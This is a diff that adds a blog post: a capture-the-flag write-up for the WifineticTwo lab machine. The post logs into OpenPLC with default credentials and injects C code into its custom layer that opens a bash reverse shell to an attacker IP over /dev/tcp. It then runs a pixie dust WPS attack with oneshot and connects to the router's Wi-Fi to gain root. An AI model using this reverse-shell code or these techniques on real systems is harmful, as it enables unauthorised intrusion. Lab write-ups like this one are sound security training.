@@ -1,0 +1,182 @@
+---
+layout: post
+title: "WifineticTwo 728a1a1fb96942678c00d6407a5a0611"
+date: 2025-09-27
+categories: writeups
+---
+
+# WifineticTwo
+
+# 1. Enumeration
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled.png' | relative_url }})
+
+There is a http service, take a look of the web application
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_1.png' | relative_url }})
+
+OpenPLC used openplc as default credentials, we use it and it worked.
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_2.png' | relative_url }})
+
+# 2. User flag
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_3.png' | relative_url }})
+
+Inside there is a section with C code that it may run on the server so we try to inject a rev shell
+
+```c
+#include "ladder.h"
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/wait.h>
+
+//-----------------------------------------------------------------------------
+// DISCLAIMER: EDDITING THIS FILE CAN BREAK YOUR OPENPLC RUNTIME! IF YOU DON'T
+// KNOW WHAT YOU'RE DOING, JUST DON'T DO IT. EDIT AT YOUR OWN RISK.
+//
+// PS: You can always restore original functionality if you broke something
+// in here by clicking on the "Restore Original Code" button above.
+//-----------------------------------------------------------------------------
+
+//-----------------------------------------------------------------------------
+// These are the ignored I/O vectors. If you want to override how OpenPLC
+// handles a particular input or output, you must put them in the ignored
+// vectors. For example, if you want to override %IX0.5, %IX0.6 and %IW3
+// your vectors must be:
+//     int ignored_bool_inputs[] = {5, 6}; //%IX0.5 and %IX0.6 ignored
+//     int ignored_int_inputs[] = {3}; //%IW3 ignored
+//
+// Every I/O on the ignored vectors will be skipped by OpenPLC hardware layer
+//-----------------------------------------------------------------------------
+int ignored_bool_inputs[] = {-1};
+int ignored_bool_outputs[] = {-1};
+int ignored_int_inputs[] = {-1};
+int ignored_int_outputs[] = {-1};
+
+//-----------------------------------------------------------------------------
+// This function is called by the main OpenPLC routine when it is initializing.
+// Hardware initialization procedures for your custom layer should be here.
+//-----------------------------------------------------------------------------
+void initCustomLayer()
+{
+}
+
+//-----------------------------------------------------------------------------
+// This function is called by OpenPLC in a loop. Here the internal input
+// buffers must be updated with the values you want. Make sure to use the mutex 
+// bufferLock to protect access to the buffers on a threaded environment.
+//-----------------------------------------------------------------------------
+void updateCustomIn()
+{
+    // Example Code - Overwritting %IW3 with a fixed value
+    // If you want to have %IW3 constantly reading a fixed value (for example, 53)
+    // you must add %IW3 to the ignored vectors above, and then just insert this 
+    // single line of code in this function:
+    //     if (int_input[3] != NULL) *int_input[3] = 53;
+}
+
+#define LHOST "10.10.14.246"
+#define LPORT "1234"
+
+//-----------------------------------------------------------------------------
+// This function is called by OpenPLC in a loop. Here the internal output
+// buffers must be updated with the values you want. Make sure to use the mutex 
+// bufferLock to protect access to the buffers on a threaded environment.
+//-----------------------------------------------------------------------------
+void updateCustomOut()
+{
+    int pipefd[2];
+    pid_t pid;
+
+    if (pipe(pipefd) == -1) {
+        exit(EXIT_FAILURE);
+    }
+
+    pid = fork();
+    if (pid == -1) {
+        exit(EXIT_FAILURE);
+    }
+
+    if (pid == 0) {
+        close(pipefd[0]);
+        dup2(pipefd[1], STDOUT_FILENO);
+        execl("/bin/bash", "/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/" LHOST "/" LPORT " 0>&1 &", NULL);
+        exit(EXIT_FAILURE);
+    } else {
+        close(pipefd[1]);
+        wait(NULL);
+    }
+```
+
+Save and compile
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_4.png' | relative_url }})
+
+It is necessary to run start PLC to execute the reverse shell. 
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_5.png' | relative_url }})
+
+# 3.Priv esc
+
+To get the root flag on this machine we need to use wlan0 interface to hack a wifi network 
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_6.png' | relative_url }})
+
+We can enumerate and try to make a pixie dust attack using oneshot, this attack steal a pin on the router which will help later to access to the password saved on the router.
+
+```jsx
+sudo airmon-ng check kill
+```
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_7.png' | relative_url }})
+
+Once we found the password it’s time to connect to the wifi network
+
+We will need two files and a set of command according with the documentation.
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_8.png' | relative_url }})
+
+First path: /etc/wpa_supplicant/wpa_supplicant-wlan0.conf
+
+```c
+ctrl_interface=/var/run/wpa_supplicant
+ctrl_interface_group=0
+update_config=1
+
+network={
+  ssid="<NETWORK_SSID>"
+  psk="<NETWORK_PASSWORD>"
+  key_mgmt=WPA-PSK
+  proto=WPA2
+  pairwise=CCMP TKIP
+  group=CCMP TKIP
+  scan_ssid=1
+}
+```
+
+Second path: /etc/systemd/network/25-wlan.network
+
+```c
+[Match]
+Name=wlan0
+
+[Network]
+DHCP=ipv4
+```
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_9.png' | relative_url }})
+
+```coq
+#Enable wpa supplicant to connect it trought it
+systemctl enable wpa_supplicant@wlan0.service
+#Restart the services to connect automatically
+systemctl restart systemd-networkd.service
+systemctl restart wpa_supplicant@wlan0.service
+```
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_10.png' | relative_url }})
+
+Use ssh to get into the router and machine pwned!!!
+
+![Untitled]({{ '/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_11.png' | relative_url }})
